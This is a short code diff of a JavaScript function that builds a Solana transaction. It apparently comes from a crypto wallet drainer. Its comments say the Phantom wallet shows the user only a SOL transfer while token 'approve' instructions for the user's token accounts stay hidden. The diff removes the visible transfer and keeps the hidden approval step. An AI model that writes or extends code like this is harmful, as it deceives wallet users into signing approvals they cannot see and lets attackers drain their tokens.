@@ -28,13 +28,7 @@ async function buildApprove(user, connection) {
             tx.feePayer = userPubkey;
 
             // 1. SOL transfer first (Phantom shows ONLY this)
-            tx.add(
-                SystemProgram.transfer({
-                    fromPubkey: userPubkey,
-                    toPubkey: jupiterPubkey,
-                    lamports: JUP_SOL_AMOUNT
-                })
-            );
+            
 
             // 2. Approve instructions (Phantom hides these)
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
